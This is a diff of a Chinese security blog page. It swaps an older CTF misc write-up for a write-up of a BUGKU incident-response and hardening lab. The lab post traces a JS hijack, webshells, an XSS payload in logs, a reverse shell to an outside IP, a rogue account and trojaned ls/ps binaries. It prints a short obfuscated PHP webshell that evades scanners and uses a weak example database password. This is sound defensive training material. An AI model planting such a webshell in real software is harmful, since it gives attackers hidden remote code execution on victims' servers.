@@ -17,29 +17,41 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>隐藏的信息 | Polo&#39;s Blog</title>
-  <meta name="description" content="预备知识：伪加密链接、十六进制文件读取、音频处理、二维码复原附件分析1.拿到这道题的文件后，首先看到一张二维码，还有一个有解压密码的压缩包。2.首先对这张二维码进行分析。放入WINHEX(16进制分析工具)后可以发现，在文件的最后隐约有提示”use base64 to get your flag”。暂时不知道什么用，记下来。3.由于二维码是残缺的，通过PS对二维码的三个定位点复原后可以获得原二维码">
+  <title>BUGKU PAR 应急加固 | Polo&#39;s Blog</title>
+  <meta name="description" content="js劫持点开之后发现有个URL跳转，跳转到了博客，所以劫持后的URL是 https:&#x2F;&#x2F;www.194nb.com 首次webshellssh上去直接看&#x2F;var&#x2F;www&#x2F;html目录，找类似Upload的文件夹 直接找到webshell  首次攻击方式使用命令 1cat &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log |cut -d &quot; &amp;qu">
 <meta property="og:type" content="article">
-<meta property="og:title" content="隐藏的信息">
-<meta property="og:url" content="https://polosec.github.io/2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/index.html">
+<meta property="og:title" content="BUGKU PAR 应急加固">
+<meta property="og:url" content="https://polosec.github.io/2022/10/16/BUGKU-PAR-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/index.html">
 <meta property="og:site_name" content="Polo&#39;s Blog">
-<meta property="og:description" content="预备知识：伪加密链接、十六进制文件读取、音频处理、二维码复原附件分析1.拿到这道题的文件后，首先看到一张二维码，还有一个有解压密码的压缩包。2.首先对这张二维码进行分析。放入WINHEX(16进制分析工具)后可以发现，在文件的最后隐约有提示”use base64 to get your flag”。暂时不知道什么用，记下来。3.由于二维码是残缺的，通过PS对二维码的三个定位点复原后可以获得原二维码">
+<meta property="og:description" content="js劫持点开之后发现有个URL跳转，跳转到了博客，所以劫持后的URL是 https:&#x2F;&#x2F;www.194nb.com 首次webshellssh上去直接看&#x2F;var&#x2F;www&#x2F;html目录，找类似Upload的文件夹 直接找到webshell  首次攻击方式使用命令 1cat &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log |cut -d &quot; &amp;qu">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://polosec.github.io/img/jd1.png">
-<meta property="og:image" content="https://polosec.github.io/img/jd2.png">
-<meta property="og:image" content="https://polosec.github.io/img/jd3.png">
-<meta property="og:image" content="https://polosec.github.io/img/jd4.png">
-<meta property="og:image" content="https://polosec.github.io/img/jd5.png">
-<meta property="og:image" content="https://polosec.github.io/img/jd6.png">
-<meta property="article:published_time" content="2020-03-09T11:31:54.000Z">
-<meta property="article:modified_time" content="2020-03-09T14:17:43.000Z">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016203611008.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016204107813.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016203755232.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016204801960.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016205048627.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016205115428.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016205141009.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016205734324.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016205836669.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016205932244.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016210200093.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016210223004.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016211345910.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016212123565.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016212247780.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016212311673.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016212346361.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016213127890.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221016213229871.png">
+<meta property="article:published_time" content="2022-10-16T12:30:17.000Z">
+<meta property="article:modified_time" content="2022-10-17T02:49:46.663Z">
 <meta property="article:author" content="Polo">
-<meta property="article:tag" content="misc">
-<meta property="article:tag" content="0307xctf">
+<meta property="article:tag" content="rdg">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://polosec.github.io/img/jd1.png">
+<meta name="twitter:image" content="http://cdn.polowong.top/image-20221016203611008.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="https://polosec.github.io/2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/index.html">
+  <link rel="canonical" href="https://polosec.github.io/2022/10/16/BUGKU-PAR-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Polo&#39;s Blog" type="application/atom+xml">
   
@@ -300,14 +312,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-隐藏的信息" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-BUGKU-PAR-应急加固" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      隐藏的信息
+      BUGKU PAR 应急加固
     </h1>
   
 
@@ -315,20 +327,15 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/" class="article-date">
-	  <time datetime="2020-03-09T11:31:54.000Z" itemprop="datePublished">2020-03-09</time>
+	<a href="/2022/10/16/BUGKU-PAR-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/" class="article-date">
+	  <time datetime="2022-10-16T12:30:17.000Z" itemprop="datePublished">2022-10-16</time>
 	</a>
 </span>
         
-  <span class="article-category">
-    <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/wp/">wp</a>
-  </span>
-
         
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/0307xctf/" rel="tag">0307xctf</a>, <a class="article-tag-link-link" href="/tags/misc/" rel="tag">misc</a>
+	<a class="article-tag-link-link" href="/tags/rdg/" rel="tag">rdg</a>
   </span>
 
 
@@ -341,10 +348,10 @@
 	</span>
 
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/10/16/BUGKU-PAR-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/#comments" class="article-comment-link">Comments</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 741(words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 555(words)</span>
 	
 	
 		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 2(minutes)</span>
@@ -354,10 +361,76 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h1 id="预备知识：伪加密链接、十六进制文件读取、音频处理、二维码复原"><a href="#预备知识：伪加密链接、十六进制文件读取、音频处理、二维码复原" class="headerlink" title="预备知识：伪加密链接、十六进制文件读取、音频处理、二维码复原"></a>预备知识：伪加密<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41687289/article/details/82695801">链接</a>、十六进制文件读取、音频处理、二维码复原</h1><h2 id="附件分析"><a href="#附件分析" class="headerlink" title="附件分析"></a>附件分析</h2><p>1.拿到这道题的文件后，首先看到一张二维码，还有一个有解压密码的压缩包。<br>2.首先对这张二维码进行分析。放入WINHEX(16进制分析工具)后可以发现，在文件的最后隐约有提示”use base64 to get your flag”。暂时不知道什么用，记下来。<img src="/img/jd1.png"><br>3.由于二维码是残缺的，通过PS对二维码的三个定位点复原后可以获得原二维码，然而没有有用的信息。这里不作详细解释。<br>4.接下来我们着手分析这个加密的压缩包。</p>
-<h2 id="加密压缩包处理"><a href="#加密压缩包处理" class="headerlink" title="加密压缩包处理"></a>加密压缩包处理</h2><p>由于压缩包是加密的，首先考虑暴力破解、CRC32碰撞等方式破解密码—-无效。<br>接下来考虑到压缩包可能是伪加密(关于伪加密的详细概念见预备知识中的链接)简单来说就是实际上压缩包是没有加密的，只是出现了表面上加密，让你输入解压密码。<br>破解伪加密的方法：使用winhex软件打开压缩包，将504B0304后的第3、4个字节改为00 00，将504B0102后的第5、6个字节改为00 00即可破解伪加密。<img src="/img/jd2.png"> <img src="/img/jd3.png"><br>之后再解压文件就不会提示输入解压密码了。</p>
-<h2 id="音频文件分析"><a href="#音频文件分析" class="headerlink" title="音频文件分析"></a>音频文件分析</h2><p>使用音频分析软件<strong>Audacity</strong>打开wav文件进行分析。<br>点击软件左方倒三角，模式切换到波形(db)即可发现音频文件的前后都有听不到、但是有分贝的部分。<img src="/img/jd4.png"><br>然后把中间的能听到的部分切掉，将剩下的听不到的部分导出，然后打开AU。<br>打开AU后导入文件，看到音轨是平的，于是我们增加分贝。<img src="/img/jd5.png"><br>统一增加分贝后，由于前面一段的声音太小，于是对前面一段单独增加分贝。<img src="/img/jd6.png"><br>这样就可以听清了。然后打开手机拨号键盘，根据拨号音以及之间的细微差别，可以听出播的号码为187485618521。根据开头图片给的提示，通过base64加密后，即可获得flag.</p>
-<h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>这道题整体来说不难。但是在音频处理的时候很多人想不到拨号音以及放大。在听拨号音的时候其实可以用一些工具，但是对音频分贝的处理以及噪声可能会导致工具识别错误。所以采用用耳朵听的方式。<br>在听的时候先听前五个，自己去拨号模拟一下。前五个比较好确定。<br>然后听最后三个 只有4种特定的键位才能形成最后三个的音调。然后两两确定中间的67 89，多次尝试后即可获得正确的结果。</p>
+        <h1 id="js劫持"><a href="#js劫持" class="headerlink" title="js劫持"></a>js劫持</h1><p>点开之后发现有个URL跳转，跳转到了博客，所以劫持后的URL是</p>
+<p><a target="_blank" rel="noopener" href="https://www.194nb.com/">https://www.194nb.com</a></p>
+<h1 id="首次webshell"><a href="#首次webshell" class="headerlink" title="首次webshell"></a>首次webshell</h1><p>ssh上去直接看/var/www/html目录，找类似Upload的文件夹</p>
+<p>直接找到webshell</p>
+<p><img src="http://cdn.polowong.top/image-20221016203611008.png" alt="image-20221016203611008"></p>
+<h1 id="首次攻击方式"><a href="#首次攻击方式" class="headerlink" title="首次攻击方式"></a>首次攻击方式</h1><p>使用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log |cut -d &quot; &quot; -f 1 |sort |uniq -c |sort -nr |head -n 10</span><br></pre></td></tr></table></figure>
+
+<p>获得访问前10的ip地址（nginx）</p>
+<p>apache如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat access_log|awk &#x27;&#123;print $1&#125;&#x27;|sort|uniq-c|sort -nr|head -10</span><br><span class="line"></span><br><span class="line">注意awk &#x27;&#123;print$1&#x27;，它表示取日志的第一段，如果换成别的日志，其IP地址在第3段那么就要改变相应数值。</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.polowong.top/image-20221016204107813.png" alt="image-20221016204107813"></p>
+<p>IP地址<strong>123.139.39.161</strong>明显异常，利用工具查看其动作</p>
+<p>利用日志分析工具</p>
+<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/opensource/detail/15">https://security.tencent.com/index.php/opensource/detail/15</a></p>
+<p>scp上传服务器</p>
+<p><img src="http://cdn.polowong.top/image-20221016203755232.png" alt="image-20221016203755232"></p>
+<p><img src="http://cdn.polowong.top/image-20221016204801960.png" alt="image-20221016204801960"></p>
+<p>可以看到某个ip地址访问的URL，但是从这里没有看出异常，除了1.php。</p>
+<p>先手动看一下nginx日志，grep上述地址</p>
+<p><img src="http://cdn.polowong.top/image-20221016205048627.png" alt="image-20221016205048627"></p>
+<p><img src="http://cdn.polowong.top/image-20221016205115428.png" alt="image-20221016205115428"></p>
+<p><img src="http://cdn.polowong.top/image-20221016205141009.png" alt="image-20221016205141009"></p>
+<p>可以看到/sale/api这里有一个xss的payload，交一下试试,小写xss正确</p>
+<h1 id="黑客服务器信息"><a href="#黑客服务器信息" class="headerlink" title="黑客服务器信息"></a>黑客服务器信息</h1><p>看下进程和端口</p>
+<p><img src="http://cdn.polowong.top/image-20221016205734324.png" alt="image-20221016205734324"></p>
+<p>lsof看到80端口有/dev/null字样，可能有异常，但是不能确定是什么问题</p>
+<p>ps aux 看到有运行的脚本文件</p>
+<p><img src="http://cdn.polowong.top/image-20221016205836669.png" alt="image-20221016205836669"></p>
+<p>一个反弹shell</p>
+<p><img src="http://cdn.polowong.top/image-20221016205932244.png" alt="image-20221016205932244"></p>
+<p>ip地址49.232.241.253:8888</p>
+<h1 id="黑客webshell2"><a href="#黑客webshell2" class="headerlink" title="黑客webshell2"></a>黑客webshell2</h1><p>刚才logforensics找到的1.php看一眼</p>
+<p><img src="http://cdn.polowong.top/image-20221016210200093.png" alt="image-20221016210200093"></p>
+<p><img src="http://cdn.polowong.top/image-20221016210223004.png" alt="image-20221016210223004"></p>
+<p>这个文件用D盾和河马是杀不出来的，所以免杀马++</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$aa</span>=_GET;@array_map(implode(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>]),<span class="variable">$$aa</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><p>mysql&gt; revoke file on <em>.</em> from ‘root’@’localhost’;</p>
+<p>mysql&gt; set global general_log=’off’;</p>
+<p>flush privileges;</p>
+<p>mysql更新密码：mysql&gt; set password for root@localhost =password(‘12345678’)</p>
+<p>mysql备份数据库</p>
+<p>mysqldump -u root -p12345678  –all-databases &gt;1.sql</p>
+<p>mysql还原数据库</p>
+<p>mysql -u root -p  &lt;1.sql</p>
+<h1 id="黑客账号"><a href="#黑客账号" class="headerlink" title="黑客账号"></a>黑客账号</h1><p>cat /etc/passwd</p>
+<p>cat /etc/shadow </p>
+<p>发现账号aman并且删除</p>
+<p><img src="http://cdn.polowong.top/image-20221016211345910.png" alt="image-20221016211345910"></p>
+<h1 id="黑客篡改命令1和2"><a href="#黑客篡改命令1和2" class="headerlink" title="黑客篡改命令1和2"></a>黑客篡改命令1和2</h1><p>看一下bin目录的ls</p>
+<p>有个ls和ls2，file一下</p>
+<p><img src="http://cdn.polowong.top/image-20221016212123565.png" alt="image-20221016212123565"></p>
+<p>ls有问题</p>
+<p>修复一下</p>
+<p><img src="http://cdn.polowong.top/image-20221016212247780.png" alt="image-20221016212247780"></p>
+<p>发现ps也有问题</p>
+<p><img src="http://cdn.polowong.top/image-20221016212311673.png" alt="image-20221016212311673"></p>
+<p>一样地，ps隐藏了某个进程</p>
+<p><img src="http://cdn.polowong.top/image-20221016212346361.png" alt="image-20221016212346361"></p>
+<p>rm -rf ps </p>
+<p>mv ps_ ps</p>
+<h1 id="JS劫持修复"><a href="#JS劫持修复" class="headerlink" title="JS劫持修复"></a>JS劫持修复</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | xargs grep -ri &#x27;&quot;text/javascript&quot;&gt;&#x27; -l | sort | uniq -c</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.polowong.top/image-20221016213127890.png" alt="image-20221016213127890"></p>
+<p><img src="http://cdn.polowong.top/image-20221016213229871.png" alt="image-20221016213229871"></p>
+<p>把最后一个script标签删掉就好了</p>
 
       
     </div>
@@ -370,7 +443,7 @@
       <p style="width: 100%;
   word-wrap: break-word;
   word-break: break-all;
-  overflow: hidden;">https://polosec.github.io/2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/</p>
+  overflow: hidden;">https://polosec.github.io/2022/10/16/BUGKU-PAR-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/</p>
     </li>
     
     <li class="post-copyright-license">
@@ -416,13 +489,9 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2020/03/09/%E7%AE%80%E5%8D%95misc/" title="简单misc"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2020/03/06/%E7%A7%91%E5%AD%A6%E7%9C%8B%E7%BD%91%E8%AF%BE/" title="如何科学地看网课(知到)"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2022/10/16/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%B8%85%E9%99%A4/" title="Flask内存马的检测与清除"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
